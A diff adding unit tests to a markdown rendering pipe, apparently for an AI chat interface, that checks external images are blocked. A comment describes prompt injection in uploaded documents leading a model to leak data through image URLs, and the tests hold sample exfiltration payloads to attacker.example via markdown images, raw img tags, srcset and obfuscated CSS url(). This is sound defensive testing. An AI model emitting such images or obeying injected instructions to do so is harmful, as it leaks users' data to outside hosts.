@@ -248,6 +248,123 @@ The largest mechanical advantage is that priests can pray sooner.`;
     expect(cells.length).toBe(2);
     expect(cells[0].textContent).toContain('First cell. Next sentence in same cell');
   });
+
+  /* External-image defang.
+
+     What is being defended: a prompt injection inside an uploaded document can induce the
+     model to emit an image whose URL carries what it has seen, and the browser fetches it on
+     render. The CSP blocks the request; these tests cover the layer that tells the user, and
+     the routes the renderer alone would miss. */
+  describe('external image defang', () => {
+    const render = (input: string): HTMLDivElement => {
+      const container = document.createElement('div');
+      container.innerHTML = pipe.transform(input) as string;
+      return container;
+    };
+
+    it('renders an external markdown image as a blocked badge and issues no request', () => {
+      const container = render('![secret](https://attacker.example/leak?q=secret)');
+
+      expect(container.querySelectorAll('img').length).toBe(0);
+
+      const badge = container.querySelector('.blocked-external-image');
+      expect(badge).toBeTruthy();
+      expect(badge!.textContent).toContain('External image blocked');
+      // The alt text is kept so the user can see what the model claimed the image was.
+      expect(badge!.textContent).toContain('secret');
+    });
+
+    it('leaves a same-origin absolute image intact', () => {
+      const container = render(`![avatar](${window.location.origin}/img/avatar.webp)`);
+
+      const images = container.querySelectorAll('img');
+      expect(images.length).toBe(1);
+      expect(images[0].getAttribute('src')).toBe(`${window.location.origin}/img/avatar.webp`);
+      expect(container.querySelector('.blocked-external-image')).toBeNull();
+    });
+
+    it('leaves a root-relative image intact', () => {
+      const container = render('![board](/img/board.webp)');
+
+      const images = container.querySelectorAll('img');
+      expect(images.length).toBe(1);
+      expect(images[0].getAttribute('src')).toBe('/img/board.webp');
+    });
+
+    it('leaves a relative image intact', () => {
+      const container = render('![board](img/board.webp)');
+
+      expect(container.querySelectorAll('img').length).toBe(1);
+      expect(container.querySelector('.blocked-external-image')).toBeNull();
+    });
+
+    it('leaves a data: image intact, because it carries its own bytes', () => {
+      const gif = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+      const container = render(`![pixel](${gif})`);
+
+      expect(container.querySelectorAll('img').length).toBe(1);
+      expect(container.querySelector('.blocked-external-image')).toBeNull();
+    });
+
+    it('blocks a protocol-relative image, which is external however the page is served', () => {
+      const container = render('![x](//attacker.example/leak.png)');
+
+      expect(container.querySelectorAll('img').length).toBe(0);
+      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
+    });
+
+    it('blocks a raw <img> in the model output, which never reaches the markdown renderer', () => {
+      const container = render('Here you go: <img src="https://attacker.example/leak?q=secret">');
+
+      expect(container.querySelectorAll('img').length).toBe(0);
+      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
+    });
+
+    it('blocks a raw <img> whose only external reference is in srcset', () => {
+      const container = render(
+        '<img src="/img/board.webp" srcset="https://attacker.example/leak.png 2x">');
+
+      expect(container.querySelectorAll('img').length).toBe(0);
+      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
+    });
+
+    it('strips a style attribute that can fetch a resource', () => {
+      const container = render(
+        '<div style="background-image:url(https://attacker.example/leak.png)">text</div>');
+
+      const div = container.querySelector('div');
+      expect(div).toBeTruthy();
+      expect(div!.getAttribute('style')).toBeNull();
+      expect(div!.textContent).toContain('text');
+    });
+
+    it('strips a style attribute hiding url() behind CSS escapes and comments', () => {
+      const escaped = render('<div style="background:\\75 rl(https://attacker.example/a.png)">a</div>');
+      expect(escaped.querySelector('div')!.getAttribute('style')).toBeNull();
+
+      const commented = render('<div style="background:ur/**/l(https://attacker.example/b.png)">b</div>');
+      expect(commented.querySelector('div')!.getAttribute('style')).toBeNull();
+    });
+
+    it('keeps a style attribute that cannot fetch anything, so KaTeX still renders', () => {
+      const container = render('<span style="height:0.8em;vertical-align:-0.1em">x</span>');
+
+      expect(container.querySelector('span')!.getAttribute('style')).toContain('height');
+    });
+
+    it('still renders math, whose glyph metrics depend on inline styles', () => {
+      const result = pipe.transform('$$ a^2 + b^2 = c^2 $$') as string;
+
+      expect(result).toContain('katex-display');
+      expect(result).toContain('style=');
+    });
+
+    it('does not touch a linked image reference inside a code block', () => {
+      const result = pipe.transform('```\n![x](https://attacker.example/leak.png)\n```') as string;
+
+      // Inside a fence it is text, not an image, and must survive verbatim.
+      expect(result).toContain('attacker.example');
+      expect(result).not.toContain('blocked-external-image');
+    });
+  });
 });
-
-
